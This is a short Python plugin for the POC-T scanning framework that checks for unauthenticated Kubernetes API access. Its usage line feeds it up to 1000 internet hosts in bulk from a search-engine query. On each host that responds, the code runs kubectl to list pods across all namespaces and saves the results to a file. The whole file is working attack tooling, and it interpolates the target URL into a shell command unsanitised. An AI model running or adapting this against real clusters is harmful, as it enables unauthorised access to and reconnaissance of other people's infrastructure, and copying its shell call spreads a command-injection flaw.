#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author =  Oritz

"""
Kubernetes api 未授权访问
https://kubernetes.io/docs/user-guide/kubectl-overview/
需要安装 kubectl
  curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.6.1/bin/linux/amd64/kubectl
  chmod +x ./kubectl
  sudo mv ./kubectl /usr/local/bin/kubectl

Usage:
  python POC-T.py -s kubernetes-unauth -aZ "healthz metrics country:cn" --limit 1000
"""

import subprocess
import requests
from plugin.useragent import firefox


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    if '443' in url:
        url = url.replace('http:', 'https:')
    try:
        g = requests.get(url, headers={'User-Agent': firefox()}, timeout=3, verify=False)
        if g.status_code is 200 and 'healthz' in g.content and 'metrics' in g.content:
            pods = subprocess.Popen("kubectl -s %s get pods --all-namespaces=true -o=wide" % url,
                                    stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=open("/dev/null", "w"), shell=True)
            output = pods.communicate()[0].decode("utf-8")
            if "Please enter Username" not in output and "Error from server" not in output:
                with open("k8s.txt", "a") as f:
                    f.write(url + "\n" + output + "\n")
                return url

    except Exception:
        pass
    return False